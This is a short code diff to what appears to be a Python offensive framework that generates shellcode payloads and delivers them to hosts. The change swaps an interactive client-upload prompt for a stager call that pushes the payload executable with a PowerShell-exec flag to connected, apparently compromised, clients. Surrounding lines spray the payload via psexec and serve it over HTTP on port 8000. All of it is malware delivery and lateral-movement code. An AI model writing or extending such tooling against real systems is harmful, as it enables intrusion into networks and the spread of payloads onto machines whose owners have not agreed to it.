@@ -84,7 +84,8 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     CleanUpPayloadMess(payloadname)
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
-        DoClientUpload(payloaddir(),payloadname,powershellExec=ez2read_shellcode,isExe=True)
+        from stager import clientUpload
+        clientUpload((payloaddir() + '/' + payloadname), powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}')
     else:
         DoPayloadUpload(payloadname)
 
@@ -102,24 +103,3 @@ def DoPayloadUpload(payloadname):
         DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
         FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir(), port=8000, printIt = True)
-
-def DoClientUpload(payloaddir,payloadname,powershellExec,isExe):
-    use_client_upload = raw_input(
-        '\n[*] Upload Using Client Connection? [y]/n: ')
-    if use_client_upload.lower() == 'y' or use_client_upload == '':
-        from menu import clientMenuOptions
-        for i in clientMenuOptions.keys():
-            if i == 'back' or i == 'r':
-                pass
-            else:
-                print t.bold_yellow + i +t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.normal + '\n'
-        while True:
-            clientchoice = raw_input('>> ')
-            try:
-                clientnumber = clientMenuOptions[clientchoice]['params']
-                break
-            except:
-                continue
-        clientUpload((payloaddir + '/' + payloadname),clientnumber,powershellExec,isExe)
-        print "Allow 20 seconds..."
-        return clientnumber
